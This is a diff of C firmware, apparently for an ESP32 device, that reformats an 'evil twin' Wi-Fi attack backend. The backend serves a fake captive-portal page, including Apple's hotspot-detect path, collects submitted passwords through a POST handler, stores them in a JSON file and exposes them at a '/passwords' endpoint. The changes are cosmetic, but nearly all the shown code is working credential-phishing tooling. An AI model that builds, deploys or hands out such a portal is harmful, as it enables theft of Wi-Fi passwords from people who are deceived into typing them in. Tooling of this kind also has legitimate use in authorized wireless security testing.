@@ -31,7 +31,7 @@
 static const char *TAG = "EVIL_TWIN_BACKEND";
 
 #include "tos_flash_paths.h"
-#define PATH_HTML_INDEX  FLASH_CAPTIVE_HTML_INDEX
+#define PATH_HTML_INDEX FLASH_CAPTIVE_HTML_INDEX
 #define PATH_HTML_THANKS FLASH_CAPTIVE_HTML_THANKS
 // Relative path for storage_assets_load_file, absolute for write
 #define PATH_PASSWORDS_REL "storage/captive_portal/passwords.json"
@@ -50,11 +50,11 @@ static size_t uploaded_template_offset = 0;
 
 static void init_storage_mutex();
 
+
 static esp_err_t submit_post_handler(httpd_req_t *req) {
   char buf[256];
   int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
-  if (ret <= 0)
-    return ESP_FAIL;
+  if (ret <= 0) return ESP_FAIL;
   buf[ret] = '\0';
 
   char password[64] = {0};
@@ -65,9 +65,9 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
 
     if (xSemaphoreTake(storage_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
       cJSON *root_array = NULL;
-
+      
       size_t size = 0;
-      char *existing_json = (char *)storage_assets_load_file(PATH_PASSWORDS_REL, &size);
+      char *existing_json = (char*)storage_assets_load_file(PATH_PASSWORDS_REL, &size);
 
       if (existing_json) {
         root_array = cJSON_Parse(existing_json);
@@ -92,7 +92,7 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
       }
       cJSON_Delete(root_array);
 
-      xSemaphoreGive(storage_mutex);
+      xSemaphoreGive(storage_mutex); 
       ESP_LOGI(TAG, "Password successfully saved to JSON");
     } else {
       ESP_LOGE(TAG, "Timeout when attempting to obtain Mutex to save password");
@@ -100,7 +100,7 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
   }
 
   size_t size = 0;
-  char *thanks = (char *)storage_assets_load_file(PATH_HTML_THANKS, &size);
+  char *thanks = (char*)storage_assets_load_file(PATH_HTML_THANKS, &size);
   if (thanks) {
     http_service_send_response(req, thanks, HTTPD_RESP_USE_STRLEN);
     free(thanks);
@@ -123,7 +123,7 @@ static esp_err_t passwords_get_handler(httpd_req_t *req) {
 
   if (xSemaphoreTake(storage_mutex, pdMS_TO_TICKS(2000)) == pdTRUE) {
     size_t size = 0;
-    char *json_data = (char *)storage_assets_load_file(PATH_PASSWORDS_REL, &size);
+    char *json_data = (char*)storage_assets_load_file(PATH_PASSWORDS_REL, &size);
     xSemaphoreGive(storage_mutex);
 
     if (json_data) {
@@ -134,8 +134,7 @@ static esp_err_t passwords_get_handler(httpd_req_t *req) {
     }
   }
 
-  http_service_send_response(
-      req, "[]", HTTPD_RESP_USE_STRLEN); // Returns empty array if no file exists
+  http_service_send_response(req, "[]", HTTPD_RESP_USE_STRLEN); // Returns empty array if no file exists
   return ESP_OK;
 }
 
@@ -149,7 +148,7 @@ static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
   // Fallback to flash asset
   size_t size = 0;
   const char *path = current_template_path ? current_template_path : PATH_HTML_INDEX;
-  char *html = (char *)storage_assets_load_file(path, &size);
+  char *html = (char*)storage_assets_load_file(path, &size);
   if (html) {
     http_service_send_response(req, html, HTTPD_RESP_USE_STRLEN);
     free(html);
@@ -158,6 +157,7 @@ static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
   http_service_send_error(req, HTTP_STATUS_NOT_FOUND_404, "Portal HTML not found");
   return ESP_FAIL;
 }
+
 
 // THIS FUNCTION SAVE PASSWORDS IN RAM
 // static esp_err_t save_captured_password(const char *password) {
@@ -195,8 +195,7 @@ void evil_twin_tmpl_begin(uint16_t total_size) {
 }
 
 void evil_twin_tmpl_chunk(const uint8_t *data, uint8_t len) {
-  if (!uploaded_template || !data || len == 0)
-    return;
+  if (!uploaded_template || !data || len == 0) return;
   size_t remaining = uploaded_template_size - uploaded_template_offset;
   size_t to_copy = (len > remaining) ? remaining : len;
   memcpy(uploaded_template + uploaded_template_offset, data, to_copy);
@@ -212,17 +211,17 @@ static void register_evil_twin_handlers(void) {
   httpd_uri_t submit_uri = {.uri = "/submit", .method = HTTP_POST, .handler = submit_post_handler};
   http_service_register_uri(&submit_uri);
 
-  httpd_uri_t passwords_uri = {
-      .uri = "/passwords", .method = HTTP_GET, .handler = passwords_get_handler};
+  httpd_uri_t passwords_uri = {.uri = "/passwords", .method = HTTP_GET, .handler = passwords_get_handler};
   http_service_register_uri(&passwords_uri);
 
   httpd_uri_t root_uri = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_get_handler};
   http_service_register_uri(&root_uri);
 
-  httpd_uri_t captive_portal_uri = {.uri = "/hotspot-detect.html",
-                                    .method = HTTP_GET,
-                                    .handler = captive_portal_get_handler,
-                                    .user_ctx = NULL};
+  httpd_uri_t captive_portal_uri = {
+    .uri = "/hotspot-detect.html",
+    .method = HTTP_GET,
+    .handler = captive_portal_get_handler,
+    .user_ctx = NULL};
   http_service_register_uri(&captive_portal_uri);
 }
 
@@ -238,8 +237,7 @@ void evil_twin_start_attack_with_template(const char *ssid, const char *template
     storage_assets_init();
   }
 
-  current_template_path =
-      (template_path && template_path[0] != '\0') ? template_path : PATH_HTML_INDEX;
+  current_template_path = (template_path && template_path[0] != '\0') ? template_path : PATH_HTML_INDEX;
   has_password = false;
   last_password[0] = '\0';
 
@@ -257,7 +255,7 @@ void evil_twin_stop_attack(void) {
   // wifi_service_init(); // Restores standard Wi-Fi mode
   if (storage_mutex != NULL) {
     vSemaphoreDelete(storage_mutex);
-    storage_mutex = NULL;
+    storage_mutex = NULL; 
   }
   ESP_LOGI(TAG, "Evil Twin logic stopped.");
 }
@@ -272,8 +270,7 @@ bool evil_twin_has_password(void) {
 }
 
 void evil_twin_get_last_password(char *out, size_t len) {
-  if (!out || len == 0)
-    return;
+  if (!out || len == 0) return;
   strncpy(out, last_password, len - 1);
   out[len - 1] = '\0';
 }
